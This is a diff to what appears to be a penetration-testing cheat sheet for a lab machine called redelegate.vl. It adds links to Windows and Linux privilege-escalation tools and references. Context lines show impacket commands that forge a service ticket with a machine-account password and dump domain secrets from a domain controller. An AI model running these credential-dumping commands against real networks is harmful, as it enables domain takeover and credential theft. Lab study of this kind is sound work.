@@ -1172,19 +1172,44 @@ impacket-getST 'redelegate.vl/FS01$:NewPassword123!' -spn cifs/dc.redelegate.vl 
 KRB5CCNAME=Administrator.ccache  impacket-secretsdump -k dc.redelegate.vl
 
 
+```
+## Useful Script To Local Windows Privilege Escalation
+```
+https://github.com/GhostPack/Seatbelt
+
+https://github.com/411Hall/JAWS
+
+https://github.com/peass-ng/PEASS-ng
 
 ```
 ## Useful Resources To Local Windows Privilege Escalation
+```
 
 https://lolbas-project.github.io/#
 
-```
-## Useful Resources
-```
-## Useful Resources 
+https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 ```
-## Useful Resources 
+## Useful Script To Linux Privilege Escalation
+```
+
+https://github.com/rebootuser/LinEnum
+
+https://github.com/sleventyeleven/linuxprivchecker
+
+https://github.com/peass-ng/PEASS-ng
+
+```
+## Useful Resources To Linux Privilege Escalation
+```
+https://gtfobins.github.io/
+
+https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
 
 ```
 ## Useful Resources 
